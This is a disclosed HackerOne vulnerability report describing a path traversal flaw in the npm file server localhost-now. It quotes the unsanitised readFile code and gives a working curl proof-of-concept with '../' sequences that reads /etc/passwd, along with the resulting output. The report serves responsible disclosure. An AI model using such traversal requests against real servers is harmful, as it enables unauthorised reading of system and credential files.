# [localhost-now] Path Traversal allows to read content of arbitrary file

## Report Details
- **Report ID**: 312889
- **URL**: https://hackerone.com/reports/312889
- **State**: Closed
- **Severity**: high
- **Submitted**: 2018-02-06T14:08:47.103Z
- **Disclosed**: 2018-02-26T21:22:37.083Z

## Reporter
- **Username**: bl4de
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: nodejs-ecosystem

## Vulnerability Information
Hi Guys,

There is Path Traversal in localhost-now module.
It allows to read content of arbitrary files on the remote server.

## Module

**localhost-now**

This is a general file server made by nodejs. It will be easy for you to access the files on the server through the browser.

https://www.npmjs.com/package/localhost-now

version: 1.0.1

Stats
0 downloads in the last day
24 downloads in the last week
89 downloads in the last month

~1100 estimated downloads per year


## Description

Lack of file path sanitization causes that any file on the server might be read by malicious user:

```javascript
// node_modules/localhost-now/lib/app.js, line 10:
    var url = req.url;

    if (url.indexOf('?') != -1) {
        url = url.split('?')[0];
    }

    var file = url === "/" ? "/index.html" : url;

    fs.readFile(path.normalize(process.cwd()) + file, function(err, data) {

```
Path is read directly from request and used to read content of file without checking against Path Traversal attempt.

## Steps To Reproduce:


- install ```localhost-now```:

```
$ npm install localhost-now
```

- run ```localhost-now``` in direcotry of your choice:

```
me:~/playground/hackerone/Node$ ./node_modules/localhost-now/bin/localhost 
Web Server started on localhost:1337
```

- execute following ```curl``` command (adjust number of ../ to reflect your system):

```
$ curl -v --path-as-is http://127.0.0.1:8080/../../../../../../etc/passwd
```

- see result:

```
*   Trying ::1...
* Connected to localhost (::1) port 1337 (#0)
> GET /../../../../../etc/passwd HTTP/1.1
> Host: localhost:1337
> User-Agent: curl/7.47.0
> Accept: */*
> 
< HTTP/1.1 200 OK
< content-type: text/
< Date: Tue, 06 Feb 2018 14:06:55 GMT
< Connection: keep-alive
< Content-Length: 2615
< 
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
(...)
```

## Supporting Material/References:


- Ubuntu 16.04 LTS
- Chromium 66.0.3333.0 (Developer Build) (64-bit) 
- Node.js version: v8.9.4 LTS
- npm version: 5.6.0
- curl 7.47.0


Please feel free to invite module maintainer to this report. I haven't contacted maintainer as I want to keep the process of fixing and disclosing bug consistent through HackerOne platform only.

I hope my report will help to keep Node.js ecosystem and its users safe in the future.

Regards,

Rafal 'bl4de' Janicki

## Impact

This vulnerability might be used to read content of any file on the server where module is run

## Attachments
No attachments
